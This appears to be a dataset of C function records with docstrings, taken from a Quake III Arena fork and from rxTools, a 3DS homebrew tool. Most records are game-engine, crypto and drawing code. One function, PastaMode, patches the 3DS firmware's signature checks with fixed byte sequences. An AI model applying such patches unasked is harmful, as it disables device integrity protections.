{"docstring": "//end of the function AAS_InitAASLinkedEntities\n//===========================================================================\n// returns the AAS area the point is in\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//===========================================================================\n", "func_signal": "int AAS_PointAreaNum(vec3_t point)", "code": "{\n\tint nodenum;\n\tvec_t\tdist;\n\taas_node_t *node;\n\taas_plane_t *plane;\n\n\tif (!aasworld.loaded)\n\t{\n\t\tbotimport.Print(PRT_ERROR, \"AAS_PointAreaNum: aas not loaded\\n\");\n\t\treturn 0;\n\t} //end if\n\n\t//start with node 1 because node zero is a dummy used for solid leafs\n\tnodenum = 1;\n\twhile (nodenum > 0)\n\t{\n//\t\tbotimport.Print(PRT_MESSAGE, \"[%d]\", nodenum);\n#ifdef AAS_SAMPLE_DEBUG\n\t\tif (nodenum >= aasworld.numnodes)\n\t\t{\n\t\t\tbotimport.Print(PRT_ERROR, \"nodenum = %d >= aasworld.numnodes = %d\\n\", nodenum, aasworld.numnodes);\n\t\t\treturn 0;\n\t\t} //end if\n#endif //AAS_SAMPLE_DEBUG\n\t\tnode = &aasworld.nodes[nodenum];\n#ifdef AAS_SAMPLE_DEBUG\n\t\tif (node->planenum < 0 || node->planenum >= aasworld.numplanes)\n\t\t{\n\t\t\tbotimport.Print(PRT_ERROR, \"node->planenum = %d >= aasworld.numplanes = %d\\n\", node->planenum, aasworld.numplanes);\n\t\t\treturn 0;\n\t\t} //end if\n#endif //AAS_SAMPLE_DEBUG\n\t\tplane = &aasworld.planes[node->planenum];\n\t\tdist = DotProduct(point, plane->normal) - plane->dist;\n\t\tif (dist > 0) nodenum = node->children[0];\n\t\telse nodenum = node->children[1];\n\t} //end while\n\tif (!nodenum)\n\t{\n#ifdef AAS_SAMPLE_DEBUG\n\t\tbotimport.Print(PRT_MESSAGE, \"in solid\\n\");\n#endif //AAS_SAMPLE_DEBUG\n\t\treturn 0;\n\t} //end if\n\treturn -nodenum;\n}", "path": "src\\engine\\botlib\\be_aas_sample.c", "repo_name": "kennyalive/Quake-III-Arena-Kenny-Edition", "stars": 276, "license": "gpl-2.0", "language": "c", "size": 10185}
{"docstring": "//\n// Placeholder functions to replace OpenGL calls when Vulkan renderer is active.\n//\n", "func_signal": "static HGLRC nowglCreateContext(HDC)", "code": "{ return NULL;}\nstatic BOOL  nowglDeleteContext(HGLRC) { return FALSE; }\nstatic PROC  nowglGetProcAddress(LPCSTR) { return NULL; }\nstatic BOOL  nowglMakeCurrent(HDC, HGLRC) { return FALSE; }\nstatic int   nowglSwapIntervalEXT( int interval ) { return -1; }\n\nstatic void noglActiveTextureARB ( GLenum texture ) {}\nstatic void noglClientActiveTextureARB ( GLenum texture ) {}\nstatic void noglLockArraysEXT (GLint, GLint) {}\nstatic void noglUnlockArraysEXT (void) {}\nstatic void noglAlphaFunc(GLenum func, GLclampf ref) {}\nstatic void noglBegin(GLenum mode) {}\nstatic void noglBindTexture(GLenum target, GLuint texture) {}\nstatic void noglBlendFunc(GLenum sfactor, GLenum dfactor) {}\nstatic void noglClear(GLbitfield mask) {}\nstatic void noglClearColor(GLclampf red, GLclampf green, GLclampf blue, GLclampf alpha) {}\nstatic void noglClipPlane(GLenum plane, const GLdouble *equation) {}\nstatic void noglColor3f(GLfloat red, GLfloat green, GLfloat blue) {}\nstatic void noglColorMask(GLboolean red, GLboolean green, GLboolean blue, GLboolean alpha) {}\nstatic void noglColorPointer(GLint size, GLenum type, GLsizei stride, const GLvoid *pointer) {}\nstatic void noglCullFace(GLenum mode) {}\nstatic void noglDeleteTextures(GLsizei n, const GLuint *textures) {}\nstatic void noglDepthFunc(GLenum func) {}\nstatic void noglDepthMask(GLboolean flag) {}\nstatic void noglDepthRange(GLclampd zNear, GLclampd zFar) {}\nstatic void noglDisable(GLenum cap) {}\nstatic void noglDisableClientState(GLenum array) {}\nstatic void noglDrawBuffer(GLenum mode) {}\nstatic void noglDrawElements(GLenum mode, GLsizei count, GLenum type, const GLvoid *indices) {}\nstatic void noglEnable(GLenum cap) {}\nstatic void noglEnableClientState(GLenum array) {}\nstatic void noglEnd(void) {}\nstatic void noglFinish(void) {}\nstatic GLenum noglGetError(void) { return GL_NO_ERROR; }\nstatic void noglGetIntegerv(GLenum pname, GLint *params) {}\nstatic const GLubyte* noglGetString(GLenum name) { static char* s = \"\"; return (GLubyte*)s;}\nstatic void noglLineWidth(GLfloat width) {}\nstatic void noglLoadIdentity(void) {}\nstatic void noglLoadMatrixf(const GLfloat *m) {}\nstatic void noglMatrixMode(GLenum mode) {}\nstatic void noglOrtho(GLdouble left, GLdouble right, GLdouble bottom, GLdouble top, GLdouble zNear, GLdouble zFar) {}\nstatic void noglPolygonMode(GLenum face, GLenum mode) {}\nstatic void noglPolygonOffset(GLfloat factor, GLfloat units) {}\nstatic void noglPopMatrix(void) {}\nstatic void noglPushMatrix(void) {}\nstatic void noglReadPixels(GLint x, GLint y, GLsizei width, GLsizei height, GLenum format, GLenum type, GLvoid *pixels) {}\nstatic void noglScissor(GLint x, GLint y, GLsizei width, GLsizei height) {}\nstatic void noglStencilFunc(GLenum func, GLint ref, GLuint mask) {}\nstatic void noglStencilOp(GLenum fail, GLenum zfail, GLenum zpass) {}\nstatic void noglTexCoord2f(GLfloat s, GLfloat t) {}\nstatic void noglTexCoord2fv(const GLfloat *v) {}\nstatic void noglTexCoordPointer(GLint size, GLenum type, GLsizei stride, const GLvoid *pointer) {}\nstatic void noglTexEnvf(GLenum target, GLenum pname, GLfloat param) {}\nstatic void noglTexImage2D(GLenum target, GLint level, GLint internalformat, GLsizei width, GLsizei height, GLint border, GLenum format, GLenum type, const GLvoid *pixels) {}\nstatic void noglTexParameterf(GLenum target, GLenum pname, GLfloat param) {}\nstatic void noglTexParameterfv(GLenum target, GLenum pname, const GLfloat *params) {}\nstatic void noglTexSubImage2D(GLenum target, GLint level, GLint xoffset, GLint yoffset, GLsizei width, GLsizei height, GLenum format, GLenum type, const GLvoid *pixels) {}\nstatic void noglVertex2f(GLfloat x, GLfloat y) {}\nstatic void noglVertex3f(GLfloat x, GLfloat y, GLfloat z) {}\nstatic void noglVertex3fv(const GLfloat *v) {}\nstatic void noglVertexPointer(GLint size, GLenum type, GLsizei stride, const GLvoid *pointer) {}\nstatic void noglViewport(GLint x, GLint y, GLsizei width, GLsizei height) {}\n\n\nstatic const char * BooleanToString( GLboolean b )\n{\n\tif ( b == GL_FALSE )\n\t\treturn \"GL_FALSE\";\n\telse if ( b == GL_TRUE )\n\t\treturn \"GL_TRUE\";\n\telse\n\t\treturn \"OUT OF RANGE FOR BOOLEAN\";\n}", "path": "src\\engine\\platform\\win_qgl.c", "repo_name": "kennyalive/Quake-III-Arena-Kenny-Edition", "stars": 276, "license": "gpl-2.0", "language": "c", "size": 10185}
{"docstring": "//end of the function AAS_FreeAASLinkHeap\n//===========================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//===========================================================================\n", "func_signal": "aas_link_t *AAS_AllocAASLink(void)", "code": "{\n\taas_link_t *link;\n\n\tlink = aasworld.freelinks;\n\tif (!link)\n\t{\n#ifndef BSPC\n\t\tif (bot_developer)\n#endif\n\t\t{\n\t\t\tbotimport.Print(PRT_FATAL, \"empty aas link heap\\n\");\n\t\t} //end if\n\t\treturn NULL;\n\t} //end if\n\tif (aasworld.freelinks) aasworld.freelinks = aasworld.freelinks->next_ent;\n\tif (aasworld.freelinks) aasworld.freelinks->prev_ent = NULL;\n\tnumaaslinks--;\n\treturn link;\n}", "path": "src\\engine\\botlib\\be_aas_sample.c", "repo_name": "kennyalive/Quake-III-Arena-Kenny-Edition", "stars": 276, "license": "gpl-2.0", "language": "c", "size": 10185}
{"docstring": "//end of the function AAS_LinkEntityClientBBox\n//===========================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//===========================================================================\n", "func_signal": "int AAS_BBoxAreas(vec3_t absmins, vec3_t absmaxs, int *areas, int maxareas)", "code": "{\n\taas_link_t *linkedareas, *link;\n\tint num;\n\n\tlinkedareas = AAS_AASLinkEntity(absmins, absmaxs, -1);\n\tnum = 0;\n\tfor (link = linkedareas; link; link = link->next_area)\n\t{\n\t\tareas[num] = link->areanum;\n\t\tnum++;\n\t\tif (num >= maxareas)\n\t\t\tbreak;\n\t} //end for\n\tAAS_UnlinkFromAreas(linkedareas);\n\treturn num;\n}", "path": "src\\engine\\botlib\\be_aas_sample.c", "repo_name": "kennyalive/Quake-III-Arena-Kenny-Edition", "stars": 276, "license": "gpl-2.0", "language": "c", "size": 10185}
{"docstring": "//===========================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//===========================================================================\n", "func_signal": "void AAS_PresenceTypeBoundingBox(int presencetype, vec3_t mins, vec3_t maxs)", "code": "{\n\tint index;\n\t//bounding box size for each presence type\n\tvec3_t boxmins[3] = {{0, 0, 0}, {-15, -15, -24}, {-15, -15, -24}};\n\tvec3_t boxmaxs[3] = {{0, 0, 0}, { 15,  15,  32}, { 15,  15,   8}};\n\n\tif (presencetype == PRESENCE_NORMAL) index = 1;\n\telse if (presencetype == PRESENCE_CROUCH) index = 2;\n\telse\n\t{\n\t\tbotimport.Print(PRT_FATAL, \"AAS_PresenceTypeBoundingBox: unknown presence type\\n\");\n\t\tindex = 2;\n\t} //end if\n\tVectorCopy(boxmins[index], mins);\n\tVectorCopy(boxmaxs[index], maxs);\n}", "path": "src\\engine\\botlib\\be_aas_sample.c", "repo_name": "kennyalive/Quake-III-Arena-Kenny-Edition", "stars": 276, "license": "gpl-2.0", "language": "c", "size": 10185}
{"docstring": "//end of the function AAS_InsideFace\n//===========================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//===========================================================================\n", "func_signal": "qboolean AAS_PointInsideFace(int facenum, vec3_t point, float epsilon)", "code": "{\n\tint i, firstvertex, edgenum;\n\tvec_t *v1, *v2;\n\tvec3_t edgevec, pointvec, sepnormal;\n\taas_edge_t *edge;\n\taas_plane_t *plane;\n\taas_face_t *face;\n\n\tif (!aasworld.loaded) return qfalse;\n\n\tface = &aasworld.faces[facenum];\n\tplane = &aasworld.planes[face->planenum];\n\t//\n\tfor (i = 0; i < face->numedges; i++)\n\t{\n\t\tedgenum = aasworld.edgeindex[face->firstedge + i];\n\t\tedge = &aasworld.edges[abs(edgenum)];\n\t\t//get the first vertex of the edge\n\t\tfirstvertex = edgenum < 0;\n\t\tv1 = aasworld.vertexes[edge->v[firstvertex]];\n\t\tv2 = aasworld.vertexes[edge->v[!firstvertex]];\n\t\t//edge vector\n\t\tVectorSubtract(v2, v1, edgevec);\n\t\t//vector from first edge point to point possible in face\n\t\tVectorSubtract(point, v1, pointvec);\n\t\t//\n\t\tCrossProduct(edgevec, plane->normal, sepnormal);\n\t\t//\n\t\tif (DotProduct(pointvec, sepnormal) < -epsilon) return qfalse;\n\t} //end for\n\treturn qtrue;\n}", "path": "src\\engine\\botlib\\be_aas_sample.c", "repo_name": "kennyalive/Quake-III-Arena-Kenny-Edition", "stars": 276, "license": "gpl-2.0", "language": "c", "size": 10185}
{"docstring": "//end of the function AAS_PresenceTypeBoundingBox\n//===========================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//===========================================================================\n", "func_signal": "void AAS_InitAASLinkHeap(void)", "code": "{\n\tint i, max_aaslinks;\n\n\tmax_aaslinks = aasworld.linkheapsize;\n\t//if there's no link heap present\n\tif (!aasworld.linkheap)\n\t{\n#ifdef BSPC\n\t\tmax_aaslinks = 6144;\n#else\n\t\tmax_aaslinks = (int) LibVarValue(\"max_aaslinks\", \"6144\");\n#endif\n\t\tif (max_aaslinks < 0) max_aaslinks = 0;\n\t\taasworld.linkheapsize = max_aaslinks;\n\t\taasworld.linkheap = (aas_link_t *) GetHunkMemory(max_aaslinks * sizeof(aas_link_t));\n\t} //end if\n\t//link the links on the heap\n\taasworld.linkheap[0].prev_ent = NULL;\n\taasworld.linkheap[0].next_ent = &aasworld.linkheap[1];\n\tfor (i = 1; i < max_aaslinks-1; i++)\n\t{\n\t\taasworld.linkheap[i].prev_ent = &aasworld.linkheap[i - 1];\n\t\taasworld.linkheap[i].next_ent = &aasworld.linkheap[i + 1];\n\t} //end for\n\taasworld.linkheap[max_aaslinks-1].prev_ent = &aasworld.linkheap[max_aaslinks-2];\n\taasworld.linkheap[max_aaslinks-1].next_ent = NULL;\n\t//pointer to the first free link\n\taasworld.freelinks = &aasworld.linkheap[0];\n\t//\n\tnumaaslinks = max_aaslinks;\n}", "path": "src\\engine\\botlib\\be_aas_sample.c", "repo_name": "kennyalive/Quake-III-Arena-Kenny-Edition", "stars": 276, "license": "gpl-2.0", "language": "c", "size": 10185}
{"docstring": "//end of the function AAS_AreaInfo\n//===========================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//===========================================================================\n", "func_signal": "aas_plane_t *AAS_PlaneFromNum(int planenum)", "code": "{\n\tif (!aasworld.loaded) return 0;\n\n\treturn &aasworld.planes[planenum];\n}", "path": "src\\engine\\botlib\\be_aas_sample.c", "repo_name": "kennyalive/Quake-III-Arena-Kenny-Edition", "stars": 276, "license": "gpl-2.0", "language": "c", "size": 10185}
{"docstring": "/*\n * SHA-256 HMAC context reset\n */\n", "func_signal": "void sha2_hmac_reset( sha2_context *ctx )", "code": "{\n    sha2_starts( ctx, ctx->is224 );\n    sha2_update( ctx, ctx->ipad, 64 );\n}", "path": "rxtools\\source\\lib\\polarssl\\sha2.c", "repo_name": "roxas75/rxTools", "stars": 264, "license": "gpl-2.0", "language": "c", "size": 50389}
{"docstring": "/*\n * output = SHA-256( file contents )\n */\n", "func_signal": "int sha2_file( const char *path, unsigned char output[32], int is224 )", "code": "{\n    FILE *f;\n    size_t n;\n    sha2_context ctx;\n    unsigned char buf[1024];\n\n    if( ( f = fopen( path, \"rb\" ) ) == NULL )\n        return( POLARSSL_ERR_SHA2_FILE_IO_ERROR );\n\n    sha2_starts( &ctx, is224 );\n\n    while( ( n = fread( buf, 1, sizeof( buf ), f ) ) > 0 )\n        sha2_update( &ctx, buf, n );\n\n    sha2_finish( &ctx, output );\n\n    memset( &ctx, 0, sizeof( sha2_context ) );\n\n    if( ferror( f ) != 0 )\n    {\n        fclose( f );\n        return( POLARSSL_ERR_SHA2_FILE_IO_ERROR );\n    }\n\n    fclose( f );\n    return( 0 );\n}", "path": "rxtools\\source\\lib\\polarssl\\sha2.c", "repo_name": "roxas75/rxTools", "stars": 264, "license": "gpl-2.0", "language": "c", "size": 50389}
{"docstring": "/*\n * AES-CBC buffer encryption/decryption\n */\n", "func_signal": "int aes_crypt_cbc( aes_context *ctx,\n                    int mode,\n                    size_t length,\n                    unsigned char iv[16],\n                    const unsigned char *input,\n                    unsigned char *output )", "code": "{\n    int i;\n    unsigned char temp[16];\n\n    if( length % 16 )\n        return( POLARSSL_ERR_AES_INVALID_INPUT_LENGTH );\n\n#if defined(POLARSSL_PADLOCK_C) && defined(POLARSSL_HAVE_X86)\n    if( aes_padlock_ace )\n    {\n        if( padlock_xcryptcbc( ctx, mode, length, iv, input, output ) == 0 )\n            return( 0 );\n        \n        // If padlock data misaligned, we just fall back to\n        // unaccelerated mode\n        //\n    }\n#endif\n\n    if( mode == AES_DECRYPT )\n    {\n        while( length > 0 )\n        {\n            memcpy( temp, input, 16 );\n            aes_crypt_ecb( ctx, mode, input, output );\n\n            for( i = 0; i < 16; i++ )\n                output[i] = (unsigned char)( output[i] ^ iv[i] );\n\n            memcpy( iv, temp, 16 );\n\n            input  += 16;\n            output += 16;\n            length -= 16;\n        }\n    }\n    else\n    {\n        while( length > 0 )\n        {\n            for( i = 0; i < 16; i++ )\n                output[i] = (unsigned char)( input[i] ^ iv[i] );\n\n            aes_crypt_ecb( ctx, mode, output, output );\n            memcpy( iv, output, 16 );\n\n            input  += 16;\n            output += 16;\n            length -= 16;\n        }\n    }\n\n    return( 0 );\n}", "path": "rxtools\\source\\lib\\polarssl\\aes.c", "repo_name": "roxas75/rxTools", "stars": 264, "license": "gpl-2.0", "language": "c", "size": 50389}
{"docstring": "/*\n * PadLock AES-ECB block en(de)cryption\n */\n", "func_signal": "int padlock_xcryptecb( aes_context *ctx,\n                       int mode,\n                       const unsigned char input[16],\n                       unsigned char output[16] )", "code": "{\n    int ebx;\n    uint32_t *rk;\n    uint32_t *blk;\n    uint32_t *ctrl;\n    unsigned char buf[256];\n\n    rk  = ctx->rk;\n    blk = PADLOCK_ALIGN16( buf );\n    memcpy( blk, input, 16 );\n\n     ctrl = blk + 4;\n    *ctrl = 0x80 | ctx->nr | ( ( ctx->nr + ( mode^1 ) - 10 ) << 9 );\n\n    __asm__( \"pushfl; popfl         \\n\"     \\\n         \"movl    %%ebx, %0     \\n\"     \\\n         \"movl    $1, %%ecx     \\n\"     \\\n         \"movl    %2, %%edx     \\n\"     \\\n         \"movl    %3, %%ebx     \\n\"     \\\n         \"movl    %4, %%esi     \\n\"     \\\n         \"movl    %4, %%edi     \\n\"     \\\n         \".byte  0xf3,0x0f,0xa7,0xc8\\n\" \\\n         \"movl    %1, %%ebx     \\n\"\n         : \"=m\" (ebx)\n         :  \"m\" (ebx), \"m\" (ctrl), \"m\" (rk), \"m\" (blk)\n         : \"ecx\", \"edx\", \"esi\", \"edi\" );\n\n    memcpy( output, blk, 16 );\n\n    return( 0 );\n}", "path": "rxtools\\source\\lib\\polarssl\\padlock.c", "repo_name": "roxas75/rxTools", "stars": 264, "license": "gpl-2.0", "language": "c", "size": 50389}
{"docstring": "//[Unused]\n", "func_signal": "void DrawHexWithName(uint8_t *screen, const wchar_t *str, uint32_t hex, uint32_t x, uint32_t y, uint32_t color, uint32_t bgcolor)", "code": "{\n\tDrawString(screen, str, x, y, color, bgcolor);\n\tDrawHex(screen, hex, x + wcslen(str) * FONT_HWIDTH, y, color, bgcolor);\n}", "path": "rxtools\\source\\lib\\ui\\draw.c", "repo_name": "roxas75/rxTools", "stars": 264, "license": "gpl-2.0", "language": "c", "size": 50389}
{"docstring": "/*\n * AES key schedule (encryption)\n */\n", "func_signal": "int aes_setkey_enc( aes_context *ctx, const unsigned char *key, unsigned int keysize )", "code": "{\n    unsigned int i;\n    uint32_t *RK;\n\n#if !defined(POLARSSL_AES_ROM_TABLES)\n    if( aes_init_done == 0 )\n    {\n        aes_gen_tables();\n        aes_init_done = 1;\n\n    }\n#endif\n\n    switch( keysize )\n    {\n        case 128: ctx->nr = 10; break;\n        case 192: ctx->nr = 12; break;\n        case 256: ctx->nr = 14; break;\n        default : return( POLARSSL_ERR_AES_INVALID_KEY_LENGTH );\n    }\n\n#if defined(POLARSSL_PADLOCK_C) && defined(PADLOCK_ALIGN16)\n    if( aes_padlock_ace == -1 )\n        aes_padlock_ace = padlock_supports( PADLOCK_ACE );\n\n    if( aes_padlock_ace )\n        ctx->rk = RK = PADLOCK_ALIGN16( ctx->buf );\n    else\n#endif\n    ctx->rk = RK = ctx->buf;\n\n    for( i = 0; i < (keysize >> 5); i++ )\n    {\n        GET_UINT32_LE( RK[i], key, i << 2 );\n    }\n\n    switch( ctx->nr )\n    {\n        case 10:\n\n            for( i = 0; i < 10; i++, RK += 4 )\n            {\n                RK[4]  = RK[0] ^ RCON[i] ^\n                ( (uint32_t) FSb[ ( RK[3] >>  8 ) & 0xFF ]       ) ^\n                ( (uint32_t) FSb[ ( RK[3] >> 16 ) & 0xFF ] <<  8 ) ^\n                ( (uint32_t) FSb[ ( RK[3] >> 24 ) & 0xFF ] << 16 ) ^\n                ( (uint32_t) FSb[ ( RK[3]       ) & 0xFF ] << 24 );\n\n                RK[5]  = RK[1] ^ RK[4];\n                RK[6]  = RK[2] ^ RK[5];\n                RK[7]  = RK[3] ^ RK[6];\n            }\n            break;\n\n        case 12:\n\n            for( i = 0; i < 8; i++, RK += 6 )\n            {\n                RK[6]  = RK[0] ^ RCON[i] ^\n                ( (uint32_t) FSb[ ( RK[5] >>  8 ) & 0xFF ]       ) ^\n                ( (uint32_t) FSb[ ( RK[5] >> 16 ) & 0xFF ] <<  8 ) ^\n                ( (uint32_t) FSb[ ( RK[5] >> 24 ) & 0xFF ] << 16 ) ^\n                ( (uint32_t) FSb[ ( RK[5]       ) & 0xFF ] << 24 );\n\n                RK[7]  = RK[1] ^ RK[6];\n                RK[8]  = RK[2] ^ RK[7];\n                RK[9]  = RK[3] ^ RK[8];\n                RK[10] = RK[4] ^ RK[9];\n                RK[11] = RK[5] ^ RK[10];\n            }\n            break;\n\n        case 14:\n\n            for( i = 0; i < 7; i++, RK += 8 )\n            {\n                RK[8]  = RK[0] ^ RCON[i] ^\n                ( (uint32_t) FSb[ ( RK[7] >>  8 ) & 0xFF ]       ) ^\n                ( (uint32_t) FSb[ ( RK[7] >> 16 ) & 0xFF ] <<  8 ) ^\n                ( (uint32_t) FSb[ ( RK[7] >> 24 ) & 0xFF ] << 16 ) ^\n                ( (uint32_t) FSb[ ( RK[7]       ) & 0xFF ] << 24 );\n\n                RK[9]  = RK[1] ^ RK[8];\n                RK[10] = RK[2] ^ RK[9];\n                RK[11] = RK[3] ^ RK[10];\n\n                RK[12] = RK[4] ^\n                ( (uint32_t) FSb[ ( RK[11]       ) & 0xFF ]       ) ^\n                ( (uint32_t) FSb[ ( RK[11] >>  8 ) & 0xFF ] <<  8 ) ^\n                ( (uint32_t) FSb[ ( RK[11] >> 16 ) & 0xFF ] << 16 ) ^\n                ( (uint32_t) FSb[ ( RK[11] >> 24 ) & 0xFF ] << 24 );\n\n                RK[13] = RK[5] ^ RK[12];\n                RK[14] = RK[6] ^ RK[13];\n                RK[15] = RK[7] ^ RK[14];\n            }\n            break;\n\n        default:\n\n            break;\n    }\n\n    return( 0 );\n}", "path": "rxtools\\source\\lib\\polarssl\\aes.c", "repo_name": "roxas75/rxTools", "stars": 264, "license": "gpl-2.0", "language": "c", "size": 50389}
{"docstring": "//Just patches signatures check, loads in sysnand\n", "func_signal": "int PastaMode()", "code": "{\n\t/*PastaMode is ready for n3ds BUT there's an unresolved bug which affects nand reading functions, like nand_readsectors(0, 0xF0000 / 0x200, firm, FIRM0);*/\n\n\tuint8_t* firm = (void*)FIRM_ADDR;\n\tnand_readsectors(0, 0xF0000 / 0x200, firm, FIRM0);\n\tif (strncmp((char*)firm, \"FIRM\", 4))\n\t\tnand_readsectors(0, 0xF0000 / 0x200, firm, FIRM1);\n\n\tif(getMpInfo() == MPINFO_CTR)\n\t{\n\t\t//o3ds patches\n\t\tunsigned char sign1[] = { 0xC1, 0x17, 0x49, 0x1C, 0x31, 0xD0, 0x68, 0x46, 0x01, 0x78, 0x40, 0x1C, 0x00, 0x29, 0x10, 0xD1 };\n\t\tunsigned char sign2[] = { 0xC0, 0x1C, 0x76, 0xE7, 0x20, 0x00, 0x74, 0xE7, 0x22, 0xF8, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x0F };\n\t\tunsigned char patch1[] = { 0x00, 0x20, 0x4E, 0xB0, 0x70, 0xBD };\n\t\tunsigned char patch2[] = { 0x00, 0x20 };\n\n\t\tfor (int i = 0; i < 0xF0000; i++){\n\t\t\tif (!memcmp(firm + i, sign1, 16)){\n\t\t\t\tmemcpy(firm + i, patch1, 6);\n\t\t\t}\n\t\t\tif (!memcmp(firm + i, sign2, 16)){\n\t\t\t\tmemcpy(firm + i, patch2, 2);\n\t\t\t}\n\t\t}\n\t}\n\telse\n\t{\n\t\t//new 3ds patches\n\t\tdecryptFirmKtrArm9((void *)FIRM_ADDR);\n\t\tuint8_t patch0[] = { 0x00, 0x20, 0x3B, 0xE0 };\n        uint8_t patch1[] = { 0x00, 0x20, 0x08, 0xE0 };\n        memcpy((uint32_t*)(FIRM_ADDR + 0xB39D8), patch0, 4);\n\t\tmemcpy((uint32_t*)(FIRM_ADDR + 0xB9204), patch1, 4);\n\t}\n\n\treturn loadExecReboot();\n}", "path": "rxtools\\source\\features\\firm.c", "repo_name": "roxas75/rxTools", "stars": 264, "license": "gpl-2.0", "language": "c", "size": 50389}
{"docstring": "//----------------New Splash Screen Stuff------------------\n", "func_signal": "void DrawTopSplash(TCHAR splash_file[], TCHAR splash_fileL[], TCHAR splash_fileR[])", "code": "{\n\tunsigned int n = 0, bin_size;\n\tFile Splash, SplashL, SplashR;\n\tif (FileOpen(&SplashL, splash_fileL, 0)&&FileOpen(&SplashR, splash_fileR, 0))\n\t{\n\t\t//Load the spash image\n\t\tbin_size = 0;\n\t\twhile ((n = FileRead(&SplashL, (void*)((uint32_t)TOP_SCREEN + bin_size), 0x100000, bin_size)) > 0) {\n\t\t\tbin_size += n;\n\t\t}\n\t\tFileClose(&SplashL);\n\t\tbin_size = 0;\n\t\twhile ((n = FileRead(&SplashR, (void*)((uint32_t)TOP_SCREEN2 + bin_size), 0x100000, bin_size)) > 0) {\n\t\t\tbin_size += n;\n\t\t}\n\t\tFileClose(&SplashR);\n\t}\n\telse if (FileOpen(&Splash, splash_file, 0))\n\t{\n\t\t//Load the spash image\n\t\tbin_size = 0;\n\t\twhile ((n = FileRead(&Splash, (void*)((uint32_t)TOP_SCREEN + bin_size), 0x100000, bin_size)) > 0) {\n\t\t\tbin_size += n;\n\t\t}\n\t\tFileClose(&Splash);\n\t\tmemcpy(TOP_SCREEN2, TOP_SCREEN, bin_size);\n\t}\n\telse\n\t{\n\t\twchar_t tmp[256];\n\t\tswprintf(tmp, sizeof(tmp)/sizeof(tmp[0]), strings[STR_ERROR_OPENING], splash_file);\n\t\tDrawString(BOT_SCREEN, tmp, FONT_WIDTH, SCREEN_HEIGHT - FONT_HEIGHT, RED, BLACK);\n\t}\n}", "path": "rxtools\\source\\lib\\ui\\draw.c", "repo_name": "roxas75/rxTools", "stars": 264, "license": "gpl-2.0", "language": "c", "size": 50389}
{"docstring": "//[Unused]\n", "func_signal": "void DrawHex(uint8_t *screen, uint32_t hex, uint32_t x, uint32_t y, uint32_t color, uint32_t bgcolor)", "code": "{\n\tuint32_t i = sizeof(hex)*2;\n\twchar_t HexStr[sizeof(hex)*2+1] = {0,};\n\twhile (i){\n\t\tHexStr[--i] = hex & 0x0F;\n\t\tHexStr[i] += HexStr[i] > 9 ? '7' : '0';\n\t\thex >>= 4;\n\t}\n\tDrawString(screen, HexStr, x, y, color, bgcolor);\n}", "path": "rxtools\\source\\lib\\ui\\draw.c", "repo_name": "roxas75/rxTools", "stars": 264, "license": "gpl-2.0", "language": "c", "size": 50389}
{"docstring": "/*\n * Checkup routine\n */\n", "func_signal": "int sha2_self_test( int verbose )", "code": "{\n    int i, j, k, buflen;\n    unsigned char buf[1024];\n    unsigned char sha2sum[32];\n    sha2_context ctx;\n\n    for( i = 0; i < 6; i++ )\n    {\n        j = i % 3;\n        k = i < 3;\n\n        if( verbose != 0 )\n            printf( \"  SHA-%d test #%d: \", 256 - k * 32, j + 1 );\n\n        sha2_starts( &ctx, k );\n\n        if( j == 2 )\n        {\n            memset( buf, 'a', buflen = 1000 );\n\n            for( j = 0; j < 1000; j++ )\n                sha2_update( &ctx, buf, buflen );\n        }\n        else\n            sha2_update( &ctx, sha2_test_buf[j],\n                               sha2_test_buflen[j] );\n\n        sha2_finish( &ctx, sha2sum );\n\n        if( memcmp( sha2sum, sha2_test_sum[i], 32 - k * 4 ) != 0 )\n        {\n            if( verbose != 0 )\n                printf( \"failed\\n\" );\n\n            return( 1 );\n        }\n\n        if( verbose != 0 )\n            printf( \"passed\\n\" );\n    }\n\n    if( verbose != 0 )\n        printf( \"\\n\" );\n\n    for( i = 0; i < 14; i++ )\n    {\n        j = i % 7;\n        k = i < 7;\n\n        if( verbose != 0 )\n            printf( \"  HMAC-SHA-%d test #%d: \", 256 - k * 32, j + 1 );\n\n        if( j == 5 || j == 6 )\n        {\n            memset( buf, '\\xAA', buflen = 131 );\n            sha2_hmac_starts( &ctx, buf, buflen, k );\n        }\n        else\n            sha2_hmac_starts( &ctx, sha2_hmac_test_key[j],\n                                    sha2_hmac_test_keylen[j], k );\n\n        sha2_hmac_update( &ctx, sha2_hmac_test_buf[j],\n                                sha2_hmac_test_buflen[j] );\n\n        sha2_hmac_finish( &ctx, sha2sum );\n\n        buflen = ( j == 4 ) ? 16 : 32 - k * 4;\n\n        if( memcmp( sha2sum, sha2_hmac_test_sum[i], buflen ) != 0 )\n        {\n            if( verbose != 0 )\n                printf( \"failed\\n\" );\n\n            return( 1 );\n        }\n\n        if( verbose != 0 )\n            printf( \"passed\\n\" );\n    }\n\n    if( verbose != 0 )\n        printf( \"\\n\" );\n\n    return( 0 );\n}", "path": "rxtools\\source\\lib\\polarssl\\sha2.c", "repo_name": "roxas75/rxTools", "stars": 264, "license": "gpl-2.0", "language": "c", "size": 50389}
